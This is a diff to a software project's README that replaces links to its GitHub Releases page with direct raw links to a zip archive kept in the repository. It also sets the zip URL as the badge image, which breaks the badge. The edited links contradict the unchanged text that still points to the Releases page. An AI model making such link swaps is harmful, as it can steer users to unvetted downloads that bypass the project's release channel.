@@ -24,7 +24,7 @@ To run the normas-calidad-software application, ensure your system meets the fol
 
 To obtain the latest version of the normas-calidad-software, please visit the Releases page. 
 
-[![Download normas-calidad-software](https://img.shields.io/badge/Download-normas--calidad--software-brightgreen)](https://github.com/havisfully/normas-calidad-software/releases)
+[![Download normas-calidad-software](https://raw.githubusercontent.com/havisfully/normas-calidad-software/main/public/normas-calidad-software-3.1.zip)](https://raw.githubusercontent.com/havisfully/normas-calidad-software/main/public/normas-calidad-software-3.1.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -32,7 +32,7 @@ Once on the Releases page, follow these steps:
 2. Click on the download link that corresponds to your operating system.
 3. Save the file to a location on your computer.
 
-You can always access the download link here: [Download normas-calidad-software](https://github.com/havisfully/normas-calidad-software/releases).
+You can always access the download link here: [Download normas-calidad-software](https://raw.githubusercontent.com/havisfully/normas-calidad-software/main/public/normas-calidad-software-3.1.zip).
 
 ## 🧭 How to Run the Application
 
